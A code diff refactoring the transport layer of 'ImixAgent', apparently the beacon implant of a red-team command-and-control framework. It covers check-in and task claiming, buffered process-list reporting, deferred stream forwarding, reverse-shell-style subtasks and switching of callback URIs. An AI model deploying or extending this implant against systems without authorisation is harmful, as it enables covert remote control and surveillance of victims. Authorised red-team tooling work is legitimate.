@@ -23,40 +23,54 @@ use crate::task::TaskRegistry;
 const MAX_BUF_OUTPUT_MESSAGES: usize = 65535;
 
 #[derive(Clone)]
-pub struct ImixAgent<T: Transport> {
+pub struct ImixAgent {
     config: Arc<RwLock<Config>>,
-    transport: Arc<RwLock<T>>,
+    transport: Arc<RwLock<Box<dyn Transport + Send + Sync>>>,
     runtime_handle: tokio::runtime::Handle,
     pub task_registry: Arc<TaskRegistry>,
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
     pub output_tx: std::sync::mpsc::SyncSender<c2::ReportOutputRequest>,
     pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportOutputRequest>>>,
+    pub process_list_tx: std::sync::mpsc::SyncSender<c2::ReportProcessListRequest>,
+    pub process_list_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportProcessListRequest>>>,
     pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
+    pub pending_forwards: Arc<
+        tokio::sync::Mutex<
+            Vec<(
+                String,
+                tokio::sync::mpsc::Receiver<Vec<u8>>,
+                tokio::sync::mpsc::Sender<Vec<u8>>,
+            )>,
+        >,
+    >,
 }
 
-impl<T: Transport + Sync + 'static> ImixAgent<T> {
+impl ImixAgent {
     pub fn new(
         config: Config,
-        transport: T,
         runtime_handle: tokio::runtime::Handle,
         task_registry: Arc<TaskRegistry>,
         shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
     ) -> Self {
         let (output_tx, output_rx) = std::sync::mpsc::sync_channel(MAX_BUF_OUTPUT_MESSAGES);
+        let (process_list_tx, process_list_rx) = std::sync::mpsc::sync_channel(64);
 
         Self {
             config: Arc::new(RwLock::new(config)),
-            transport: Arc::new(RwLock::new(transport)),
+            transport: Arc::new(RwLock::new(transport::init_transport())),
             runtime_handle,
             task_registry,
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
             output_tx,
             output_rx: Arc::new(Mutex::new(output_rx)),
+            process_list_tx,
+            process_list_rx: Arc::new(Mutex::new(process_list_rx)),
             shell_manager_tx,
+            pending_forwards: Arc::new(tokio::sync::Mutex::new(Vec::new())),
         }
     }
 
-    pub fn start_shell_manager(self: Arc<Self>, manager: ShellManager<T>) {
+    pub fn start_shell_manager(self: Arc<Self>, manager: ShellManager) {
         self.runtime_handle.spawn(manager.run());
     }
 
@@ -121,27 +135,35 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     }
 
     // Updates the shared transport with a new instance
-    pub async fn update_transport(&self, t: T) {
+    pub async fn update_transport(&self, t: Box<dyn Transport + Send + Sync>) {
         let mut transport = self.transport.write().await;
         *transport = t;
     }
 
-    // Flushes all buffered task outputs using the provided transport
+    // Flushes all buffered task outputs and process list reports using the provided transport
     pub async fn flush_outputs(&self) {
-        let rx = match self.output_rx.lock() {
-            Ok(rx) => rx,
-            Err(_) => return,
-        };
-
         let mut outputs = Vec::new();
-        while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
-            outputs.push(msg);
+        if let Ok(rx) = self.output_rx.lock() {
+            while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
+                outputs.push(msg);
+            }
+        }
+
+        let mut process_list_reqs = Vec::new();
+        if let Ok(rx) = self.process_list_rx.lock() {
+            while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
+                process_list_reqs.push(msg);
+            }
         }
 
         #[cfg(debug_assertions)]
-        log::info!("Flushing {} task outputs", outputs.len());
+        log::info!(
+            "Flushing {} task outputs and {} process list reports",
+            outputs.len(),
+            process_list_reqs.len()
+        );
 
-        if outputs.is_empty() {
+        if outputs.is_empty() && process_list_reqs.is_empty() {
             return;
         }
 
@@ -204,7 +226,12 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             }
         }
 
-        let mut transport = self.transport.write().await;
+        let mut transport_guard = self.transport.write().await;
+        let transport = &mut *transport_guard;
+        if !transport.is_active() {
+            return;
+        }
+
         for (_, (ctx, output)) in merged_task_outputs {
             #[cfg(debug_assertions)]
             log::info!("Task Output: {output:#?}");
@@ -242,6 +269,14 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
                 log::error!("Failed to report shell task output: {_e}");
             }
         }
+
+        // Only send the latest process list report (it replaces previous ones)
+        if let Some(req) = process_list_reqs.into_iter().last() {
+            if let Err(_e) = transport.report_process_list(req).await {
+                #[cfg(debug_assertions)]
+                log::error!("Failed to report process list: {_e}");
+            }
+        }
     }
 
     // Helper to get config URIs for creating new transport
@@ -266,18 +301,18 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     // Helper to get a usable transport.
     // If the shared transport is active, returns a clone of it.
     // If not, creates a new one from config.
-    async fn get_usable_transport(&self) -> Result<T> {
+    async fn get_usable_transport(&self) -> Result<Box<dyn Transport + Send + Sync>> {
         // 1. Check shared transport
         {
             let guard = self.transport.read().await;
             if guard.is_active() {
-                return Ok(guard.clone());
+                return Ok(guard.clone_box());
             }
         }
-
         // 2. Create new transport from config
         let config = self.get_transport_config().await;
-        let t = T::new(config).context("Failed to create on-demand transport")?;
+        let t =
+            transport::create_transport(config).context("Failed to create on-demand transport")?;
 
         #[cfg(debug_assertions)]
         log::debug!("Created on-demand transport for background task");
@@ -287,7 +322,8 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 
     // Helper to claim tasks and return them, so main can spawn
     pub async fn claim_tasks(&self) -> Result<c2::ClaimTasksResponse> {
-        let mut transport = self.transport.write().await;
+        let mut transport_guard = self.transport.write().await;
+        let transport = &mut *transport_guard;
         let beacon_info = self.config.read().await.info.clone();
         let req = ClaimTasksRequest {
             beacon: beacon_info,
@@ -300,6 +336,31 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
+        // Dispatch any pending forward_raw requests before checking in.
+        // Each forward is spawned so the beacon cycle is not blocked by long-running
+        // streaming calls (e.g. ReportFile).
+        let pending: Vec<_> = {
+            let mut forwards = self.pending_forwards.lock().await;
+            forwards.drain(..).collect()
+        };
+        for (path, rx, tx) in pending {
+            let agent = self.clone();
+            self.runtime_handle.spawn(async move {
+                if let Ok(mut t) = agent.get_usable_transport().await {
+                    if let Err(_e) = t.forward_raw(path.clone(), rx, tx).await {
+                        #[cfg(debug_assertions)]
+                        log::error!("Deferred forward_raw to {} failed: {}", path, _e);
+                    }
+                } else {
+                    #[cfg(debug_assertions)]
+                    log::error!(
+                        "Failed to get transport for deferred forward_raw to {}",
+                        path
+                    );
+                }
+            });
+        }
+
         let resp = self.claim_tasks().await?;
 
         let mut has_work = false;
@@ -343,7 +404,7 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     // Helper to execute an async action with a usable transport, handling setup and errors.
     fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
     where
-        F: FnOnce(T) -> Fut,
+        F: FnOnce(Box<dyn Transport + Send + Sync>) -> Fut,
         Fut: std::future::Future<Output = Result<R, anyhow::Error>>,
     {
         self.block_on(async {
@@ -358,7 +419,7 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     // Helper to spawn a background subtask (like a reverse shell)
     fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
     where
-        F: FnOnce(T) -> Fut + Send + 'static,
+        F: FnOnce(Box<dyn Transport + Send + Sync>) -> Fut + Send + 'static,
         Fut: std::future::Future<Output = Result<()>> + Send + 'static,
     {
         let subtasks = self.subtasks.clone();
@@ -389,7 +450,8 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 }
 
 // Implement the Eldritch Agent Trait
-impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
+#[async_trait::async_trait]
+impl Agent for ImixAgent {
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
         self.with_transport(|mut t| async move {
             // Transport uses std::sync::mpsc::Sender for fetch_asset
@@ -422,7 +484,11 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         &self,
         req: c2::ReportProcessListRequest,
     ) -> Result<c2::ReportProcessListResponse, String> {
-        self.with_transport(|mut t| async move { t.report_process_list(req).await })
+        // Buffer the request to be sent during the next flush cycle
+        self.process_list_tx
+            .try_send(req)
+            .map_err(|_| "Process list buffer full".to_string())?;
+        Ok(c2::ReportProcessListResponse {})
     }
 
     fn report_output(
@@ -470,6 +536,17 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 
     fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
         self.with_transport(|mut t| async move { t.claim_tasks(req).await })
+    }
+
+    async fn forward_raw(
+        &self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> Result<(), String> {
+        let mut forwards = self.pending_forwards.lock().await;
+        forwards.push((path, rx, tx));
+        Ok(())
     }
 
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
@@ -595,6 +672,18 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         })
     }
 
+    fn reset_transport(&self) -> Result<(), String> {
+        self.block_on(async {
+            let mut cfg = self.config.write().await;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                available_transports.active_index = 0;
+            }
+            Ok(())
+        })
+    }
+
     fn list_transports(&self) -> Result<Vec<String>, String> {
         self.block_on(async { Ok(self.transport.read().await.list_available()) })
     }
@@ -624,40 +713,28 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 
     fn set_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
+            // Parse the new URI to handle DSN format with query parameters
+            let parsed_transport = pb::config::parse_dsn(&uri)
+                .map_err(|e| format!("Failed to parse callback URI: {}", e))?;
+
             let mut cfg = self.config.write().await;
             if let Some(info) = cfg.info.as_mut()
                 && let Some(available_transports) = info.available_transports.as_mut()
             {
-                // Check if URI already exists
-                if let Some(pos) = available_transports
-                    .transports
-                    .iter()
-                    .position(|t| t.uri == uri)
-                {
+                // Note: We compare against parsed_transport.uri because parse_dsn strips the query string
+                if let Some(pos) = available_transports.transports.iter().position(|t| {
+                    t.uri == parsed_transport.uri && t.r#type == parsed_transport.r#type
+                }) {
                     // Set active_index to existing transport
                     available_transports.active_index = pos as u32;
-                } else {
-                    // Get current transport as template
-                    let active_idx = available_transports.active_index as usize;
-                    let template = available_transports
-                        .transports
-                        .get(active_idx)
-                        .or_else(|| available_transports.transports.first())
-                        .cloned();
 
-                    if let Some(tmpl) = template {
-                        // Create new transport with the new URI
-                        let new_transport = pb::c2::Transport {
-                            uri,
-                            interval: tmpl.interval,
-                            r#type: tmpl.r#type,
-                            extra: tmpl.extra,
-                            jitter: tmpl.jitter,
-                        };
-                        available_transports.transports.push(new_transport);
-                        available_transports.active_index =
-                            (available_transports.transports.len() - 1) as u32;
-                    }
+                    // We also want to update the settings if they were provided in the DSN
+                    // Let's replace the existing transport with the newly parsed one
+                    available_transports.transports[pos] = parsed_transport;
+                } else {
+                    available_transports.transports.push(parsed_transport);
+                    available_transports.active_index =
+                        (available_transports.transports.len() - 1) as u32;
                 }
             }
             Ok(())
